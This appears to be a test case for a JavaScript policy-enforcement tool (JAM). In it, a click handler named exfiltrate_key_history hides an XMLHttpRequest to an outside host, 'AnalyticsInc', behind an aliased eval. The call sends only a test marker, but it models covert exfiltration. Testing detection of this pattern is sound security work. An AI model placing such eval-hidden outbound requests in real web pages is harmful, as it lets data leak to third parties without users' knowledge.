introspect(JAM.policy.pFull) {
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=eval1", true);xmlhttp.send(null);';
  1;
  var v0 = eval;
  v0(exp);
  return
}
var v1 = document.getElementById("test");
v1.onclick = exfiltrate_key_history;

}
